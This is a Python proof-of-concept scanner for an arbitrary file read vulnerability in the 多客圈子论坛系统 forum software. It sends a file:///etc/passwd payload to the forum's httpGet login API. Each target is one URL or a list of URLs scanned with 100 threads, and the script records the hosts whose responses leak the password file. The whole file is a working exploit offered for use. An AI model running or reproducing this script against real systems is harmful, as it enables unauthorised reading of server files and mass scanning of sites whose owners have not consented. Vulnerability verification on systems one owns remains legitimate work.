import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    text = """██╗    ██╗██╗   ██╗        ██╗  ██╗██╗   ██╗
██║    ██║██║   ██║        ██║  ██║██║   ██║
██║ █╗ ██║██║   ██║        ███████║██║   ██║
██║███╗██║██║   ██║        ██╔══██║██║   ██║
╚███╔███╔╝╚██████╔╝███████╗██║  ██║╚██████╔╝
 ╚══╝╚══╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ 
               author=芜湖
               version=1.1.1                             """
    print(text)


def main():
    banner()
    parser = argparse.ArgumentParser(description="多客圈子论坛系统 httpGet 任意文件读取漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='please input your url ')
    parser.add_argument('-f', '--file', dest='file', type=str, help='please input your file ')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        file_url = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                file_url.append(url.strip())
        mp = Pool(100)
        mp.map(poc,file_url)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')


def poc(target):
    payload = '/index.php/api/login/httpGet?url=file:///etc/passwd'
    headers = {
        'User-Agent': 'Mozilla/5.0(X11;CrOSi6863912.101.0)AppleWebKit/537.36(KHTML,likeGecko)Chrome/27.0.1453.116Safari/537.36',
        'Content-Length': '2',
    }
    proxies = {
            'http':'http://127.0.0.1:8080',
            'https':'http://127.0.0.1:8080',
        }
    try:
        res = requests.get(url=target+payload,headers=headers,verify=False,timeout=5,proxies=proxies)
        # print(res.text)
        if '/sbin/nologin' in res.text:
            print(f'[+]存在漏洞{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
        else:
            print(f'[-]不存在漏洞{target}')
    except:
        print('该站点存在问题')


if __name__ == '__main__':
    main()